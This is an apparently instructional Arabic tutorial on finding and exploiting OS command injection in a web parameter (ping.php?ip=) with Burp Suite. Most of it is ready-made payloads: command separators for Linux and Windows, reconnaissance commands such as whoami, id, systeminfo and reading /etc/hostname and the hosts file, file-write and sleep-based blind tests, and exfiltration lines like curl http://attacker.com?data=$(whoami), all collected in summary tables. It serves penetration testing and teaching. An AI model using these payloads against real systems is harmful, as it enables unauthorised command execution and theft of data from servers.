
## الخطوات العملية لاختبار الأوامر الأساسية
1. **إعداد البيئة**:
   - استخدم **Burp Suite** أو **OWASP ZAP** لمراقبة وتعديل الطلبات.
   - شغّل متصفح مع وكيل (Proxy) مضبوط على `127.0.0.1:8080`.
   - حدد حقل الإدخال أو معلمة URL المستهدفة (مثل `ip` في `ping.php?ip=`).
2. **اختبار فواصل الأوامر**:
   - أدخل فواصل شائعة (`;`, `&&`, `||`, `|`) مع أوامر بسيطة لمعرفة إيه اللي بيشتغل.
   - مثال: `127.0.0.1; whoami` أو `127.0.0.1 && dir`.
3. **تجربة أوامر استكشافية**:
   - استخدم أوامر مثل `whoami`, `id`, `ls`, `dir`, `cat`, `type` لاستكشاف النظام.
   - راقب استجابات التطبيق (مثل ظهور مخرجات الأوامر أو تغيير في الصفحة).
4. **التعامل مع Blind Injection**:
   - لو مخرجات الأوامر مش بتظهر (Blind Injection)، استخدم أوامر تؤثر على النظام بشكل غير مباشر (مثل إنشاء ملف أو إرسال بيانات إلى خادمك).
5. **توثيق النتايج**:
   - سجّل الأوامر الناجحة والاستجابات في Burp Suite.
   - التقط لقطات شاشة لتثبت نجاح الثغرة.

---

## جميع المحاولات الممكنة لاختبار الأوامر الأساسية
هقسم المحاولات إلى ثلاث فئات رئيسية:
1. **اختبار فواصل الأوامر**: لتأكيد إن الحقن ممكن.
2. **أوامر استكشاف النظام**: لمعرفة نوع النظام والصلاحيات.
3. **أوامر اختبار Blind Injection**: للتعامل مع الحالات اللي مخرجات الأوامر مش بتظهر.

### 1. اختبار فواصل الأوامر
الهدف هو التأكد إن فواصل الأوامر (مثل `;`, `&&`) بتسمح بتنفيذ أوامر إضافية.

#### أ. فاصل الأمر (`;`) في Linux
- **الإدخال**:
  ```
  http://example.com/ping.php?ip=127.0.0.1; whoami
  ```
- **الطلب**:
  ```
  GET /ping.php?ip=127.0.0.1; whoami HTTP/1.1
  Host: example.com
  ```
- **كيف يعمل**:
  - `;` تفصل بين الأمر الأصلي (`ping -c 4 127.0.0.1`) والأمر الضار (`whoami`).
  - إذا ظهرت استجابة تحتوي على اسم المستخدم (مثل `www-data`)، فالثغرة موجودة.
- **متى يُستخدم؟**:
  - كخطوة أولى لاختبار Command Injection على خادم Linux.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الاستجابة (مثل ظهور `www-data` أو تغيير في النص).

#### ب. فاصل الأمر (`&&`) في Linux
- **الإدخال**:
  ```
  http://example.com/ping.php?ip=127.0.0.1 && whoami
  ```
- **الطلب**:
  ```
  GET /ping.php?ip=127.0.0.1 && whoami HTTP/1.1
  Host: example.com
  ```
- **كيف يعمل**:
  - `&&` ينفذ الأمر الثاني فقط إذا نجح الأول.
  - إذا ظهرت استجابة تحتوي على `www-data`، فالفاصل يعمل.
- **متى يُستخدم؟**:
  - إذا فشل `;` أو كنت عايز تتأكد إن الأمر الأصلي بينجح.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - قارن الاستجابة مع طلب بدون `&&`.

#### ج. فاصل الأمر (`&`) في Windows
- **الإدخال**:
  ```
  http://example.com/ping.php?ip=127.0.0.1 & whoami
  ```
- **الطلب**:
  ```
  GET /ping.php?ip=127.0.0.1 & whoami HTTP/1.1
  Host: example.com
  ```
- **كيف يعمل**:
  - `&` ينفذ الأمر الثاني بغض النظر عن نجاح الأول في Windows.
  - إذا ظهرت استجابة تحتوي على اسم المستخدم (مثل `Administrator`)، فالثغرة موجودة.
- **متى يُستخدم؟**:
  - عند الاشتباه إن الخادم يعمل بنظام Windows.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الاستجابة لظهور اسم مستخدم Windows.

#### د. فاصل الأمر (`||`) في Linux
- **الإدخال**:
  ```
  http://example.com/ping.php?ip=127.0.0.1 || whoami
  ```
- **الطلب**:
  ```
  GET /ping.php?ip=127.0.0.1 || whoami HTTP/1.1
  Host: example.com
  ```
- **كيف يعمل**:
  - `||` ينفذ الأمر الثاني إذا فشل الأول.
  - إذا ظهرت استجابة تحتوي على `www-data`، فالفاصل يعمل.
- **متى يُستخدم؟**:
  - لاختبار سلوك التطبيق إذا كان الأمر الأصلي بيفشل.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - جرب مع مدخل غير صالح (مثل `invalid_ip || whoami`).

#### هـ. أنبوب الأوامر (`|`) في Linux
- **الإدخال**:
  ```
  http://example.com/ping.php?ip=127.0.0.1 | whoami
  ```
- **الطلب**:
  ```
  GET /ping.php?ip=127.0.0.1 | whoami HTTP/1.1
  Host: example.com
  ```
- **كيف يعمل**:
  - `|` يمرر مخرجات الأمر الأول إلى الأمر الثاني، لكن في بعض الحالات بينفذ الأمر الثاني مباشرة.
  - إذا ظهرت استجابة تحتوي على `www-data`، فالثغرة موجودة.
- **متى يُستخدم؟**:
  - إذا فشلت الفواصل الأخرى أو كنت عايز تختبر سلوك الأنبوب.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من الاستجابة.

### 2. أوامر استكشاف النظام
الهدف هو جمع معلومات عن النظام (نوع نظام التشغيل، المستخدم، الملفات).

#### أ. معرفة المستخدم الحالي
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; whoami
    ```
  - **الأمر**: `whoami`
  - **النتيجة المتوقعة**: اسم المستخدم (مثل `www-data`, `root`).
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & whoami
    ```
  - **النتيجة المتوقعة**: اسم المستخدم (مثل `Administrator`, `SYSTEM`).
- **متى يُستخدم؟**:
  - لتحديد صلاحيات التطبيق على الخادم.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - سجّل اسم المستخدم لتحديد الصلاحيات.

#### ب. معرفة معلومات النظام
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; id
    ```
  - **الأمر**: `id`
  - **النتيجة المتوقعة**: معلومات المستخدم والمجموعات (مثل `uid=33(www-data) gid=33(www-data)`).
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & systeminfo
    ```
  - **الأمر**: `systeminfo`
  - **النتيجة المتوقعة**: تفاصيل النظام (مثل إصدار Windows، اسم الخادم).
- **متى يُستخدم؟**:
  - لمعرفة نوع النظام والإصدار.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحليل الاستجابة لتحديد نوع النظام.

#### ج. عرض الملفات في الدليل الحالي
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; ls
    ```
  - **الأمر**: `ls` أو `ls -la`
  - **النتيجة المتوقعة**: قائمة الملفات (مثل `index.php config.php`).
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & dir
    ```
  - **الأمر**: `dir`
  - **النتيجة المتوقعة**: قائمة الملفات (مثل `index.php config.php`).
- **متى يُستخدم؟**:
  - لاستكشاف الملفات في دليل التطبيق.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - سجّل الملفات لتحديد الأهداف (مثل ملفات التكوين).

#### د. قراءة ملف بسيط
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; cat /etc/hostname
    ```
  - **الأمر**: `cat /etc/hostname`
  - **النتيجة المتوقعة**: اسم الخادم (مثل `webserver01`).
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts
    ```
  - **الأمر**: `type C:\Windows\System32\drivers\etc\hosts`
  - **النتيجة المتوقعة**: محتويات ملف `hosts`.
- **متى يُستخدم؟**:
  - لاختبار الوصول إلى ملفات غير حساسة قبل استهداف ملفات مهمة.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من ظهور محتويات الملف.

#### هـ. اختبار الاتصال
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; ping -c 1 attacker.com
    ```
  - **الأمر**: `ping -c 1 attacker.com`
  - **النتيجة المتوقعة**: استجابة من `attacker.com` أو تأكيد الاتصال.
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & ping -n 1 attacker.com
    ```
  - **الأمر**: `ping -n 1 attacker.com`
  - **النتيجة المتوقعة**: نفس الشيء.
- **متى يُستخدم؟**:
  - للتحقق إذا كان الخادم يسمح بالاتصال الخارجي.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - راقب استجابة `ping` أو استخدم خادمك لتأكيد الاتصال.

### 3. أوامر اختبار Blind Injection
الهدف هو اختبار الثغرة في حالة عدم ظهور مخرجات الأوامر (Blind Injection).

#### أ. إنشاء ملف للتأكيد
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; echo "Hacked" > /tmp/test.txt
    ```
  - **الأمر**: `echo "Hacked" > /tmp/test.txt`
  - **النتيجة المتوقعة**: إنشاء ملف `/tmp/test.txt`. تحقق لاحقًا:
    ```
    http://example.com/ping.php?ip=127.0.0.1; cat /tmp/test.txt
    ```
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & echo Hacked > C:\Temp\test.txt
    ```
  - **الأمر**: `echo Hacked > C:\Temp\test.txt`
  - **النتيجة المتوقعة**: إنشاء ملف `C:\Temp\test.txt`. تحقق:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & type C:\Temp\test.txt
    ```
- **متى يُستخدم؟**:
  - عندما لا تظهر مخرجات الأوامر مباشرة.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - تحقق من وجود الملف بقراءته.

#### ب. إرسال بيانات إلى خادم خارجي
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; curl http://attacker.com?data=$(whoami)
    ```
  - **الأمر**: `curl http://attacker.com?data=$(whoami)`
  - **النتيجة المتوقعة**: طلب HTTP يصل إلى خادمك يحتوي على `www-data`.
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & curl http://attacker.com?data=%USERNAME%
    ```
  - **الأمر**: `curl http://attacker.com?data=%USERNAME%`
  - **النتيجة المتوقعة**: نفس الشيء.
- **متى يُستخدم؟**:
  - لتأكيد التنفيذ في Blind Injection عبر الاتصال الخارجي.
- **الأوامر/الإجراءات**:
  - شغّل خادم HTTP بسيط على جهازك:
    ```
    python3 -m http.server 80
    ```
  - أرسل الطلب في Burp Suite.
  - تحقق من السجلات على خادمك.

#### ج. تأخير الاستجابة (Time-Based)
- **Linux**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1; sleep 5
    ```
  - **الأمر**: `sleep 5`
  - **النتيجة المتوقعة**: استجابة التطبيق تتأخر 5 ثوانٍ.
- **Windows**:
  - **الإدخال**:
    ```
    http://example.com/ping.php?ip=127.0.0.1 & timeout 5
    ```
  - **الأمر**: `timeout 5`
  - **النتيجة المتوقعة**: نفس الشيء.
- **متى يُستخدم؟**:
  - لتأكيد التنفيذ إذا لم تظهر مخرجات أو لم يكن هناك اتصال خارجي.
- **الأوامر/الإجراءات**:
  - أرسل الطلب في Burp Suite Repeater.
  - قارن وقت الاستجابة مع طلب عادي.

---

## ملخص جميع المحاولات
### اختبار فواصل الأوامر
| **الغرض**                     | **الإدخال**                                                                 | **الطلب**                                                                 | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------|---------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| فاصل `;` (Linux)             | `127.0.0.1; whoami`                                                         | `GET /ping.php?ip=127.0.0.1; whoami`                                      | لاختبار Command Injection على Linux.                                             |
| فاصل `&&` (Linux)            | `127.0.0.1 && whoami`                                                       | `GET /ping.php?ip=127.0.0.1 && whoami`                                    | إذا كان الأمر الأصلي يحتاج إلى نجاح.                                            |
| فاصل `&` (Windows)           | `127.0.0.1 & whoami`                                                        | `GET /ping.php?ip=127.0.0.1 & whoami`                                     | لاختبار Command Injection على Windows.                                           |
| فاصل `||` (Linux)            | `127.0.0.1 || whoami`                                                       | `GET /ping.php?ip=127.0.0.1 || whoami`                                    | إذا كان الأمر الأصلي قد يفشل.                                                    |
| أنبوب `|` (Linux)            | `127.0.0.1 | whoami`                                                        | `GET /ping.php?ip=127.0.0.1 | whoami`                                     | لاختبار سلوك الأنبوب.                                                           |

### أوامر استكشاف النظام
| **الغرض**                     | **الإدخال (Linux)**                                                        | **الإدخال (Windows)**                                                    | **النتيجة المتوقعة**                                                     | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| معرفة المستخدم               | `127.0.0.1; whoami`                                                         | `127.0.0.1 & whoami`                                                     | `www-data` أو `Administrator`                                             | لتحديد صلاحيات التطبيق.                                                         |
| معلومات النظام               | `127.0.0.1; id`                                                             | `127.0.0.1 & systeminfo`                                                 | `uid=33(www-data)` أو إصدار Windows                                      | لتحديد نوع النظام والإصدار.                                                     |
| عرض الملفات                  | `127.0.0.1; ls`                                                             | `127.0.0.1 & dir`                                                        | قائمة الملفات (مثل `index.php`)                                          | لاستكشاف دليل التطبيق.                                                          |
| قراءة ملف                    | `127.0.0.1; cat /etc/hostname`                                              | `127.0.0.1 & type C:\Windows\System32\drivers\etc\hosts`                 | اسم الخادم أو محتويات ملف `hosts`                                        | لاختبار الوصول إلى ملفات.                                                       |
| اختبار الاتصال               | `127.0.0.1; ping -c 1 attacker.com`                                         | `127.0.0.1 & ping -n 1 attacker.com`                                     | استجابة من `attacker.com`                                                | للتحقق من الاتصال الخارجي.                                                      |

### أوامر اختبار Blind Injection
| **الغرض**                     | **الإدخال (Linux)**                                                        | **الإدخال (Windows)**                                                    | **النتيجة المتوقعة**                                                     | **متى يُستخدم؟**                                                                 |
|-------------------------------|-----------------------------------------------------------------------------|---------------------------------------------------------------------------|---------------------------------------------------------------------------|-----------------------------------------------------------------------------------|
| إنشاء ملف                    | `127.0.0.1; echo "Hacked" > /tmp/test.txt`                                  | `127.0.0.1 & echo Hacked > C:\Temp\test.txt`                             | إنشاء ملف `test.txt`                                                     | عند عدم ظهور مخرجات الأوامر.                                                    |
| إرسال بيانات خارجية          | `127.0.0.1; curl http://attacker.com?data=$(whoami)`                        | `127.0.0.1 & curl http://attacker.com?data=%USERNAME%`                   | طلب HTTP يصل إلى خادمك                                                  | لتأكيد التنفيذ عبر الاتصال الخارجي.                                             |
| تأخير الاستجابة              | `127.0.0.1; sleep 5`                                                        | `127.0.0.1 & timeout 5`                                                  | تأخير 5 ثوانٍ في الاستجابة                                              | لتأكيد التنفيذ بدون مخرجات.                                                     |

---

## مثال عملي باستخدام Burp Suite
1. **إعداد Burp Suite**:
   - اضبط الوكيل إلى `127.0.0.1:8080`.
   - افتح المتصفح وتصفح: `http://example.com/ping.php?ip=127.0.0.1`.
2. **اختبار فواصل الأوامر**:
   - أرسل طلب في Burp Suite Repeater:
     ```
     GET /ping.php?ip=127.0.0.1; whoami HTTP/1.1
     Host: example.com
     ```
   - تحقق من الاستجابة (مثل ظهور `www-data`).
   - كرر مع `&&`, `|`, `&`:
     ```
     GET /ping.php?ip=127.0.0.1 && whoami HTTP/1.1
     Host: example.com
     ```
3. **اختبار أوامر استكشافية**:
   - أرسل:
     ```
     GET /ping.php?ip=127.0.0.1; ls HTTP/1.1
     Host: example.com
     ```
   - إذا ظهرت ملفات (مثل `index.php`), جرب قراءة ملف:
     ```
     GET /ping.php?ip=127.0.0.1; cat /etc/hostname HTTP/1.1
     Host: example.com
     ```
4. **اختبار Blind Injection**:
   - إذا لم تظهر مخرجات، أرسل:
     ```
     GET /ping.php?ip=127.0.0.1; sleep 5 HTTP/1.1
     Host: example.com
     ```
   - إذا تأخرت الاستجابة 5 ثوانٍ، الثغرة موجودة.
   - جرب إرسال بيانات:
     ```
     GET /ping.php?ip=127.0.0.1; curl http://attacker.com?data=$(whoami) HTTP/1.1
     Host: example.com
     ```
   - تحقق من السجلات على خادمك.

---
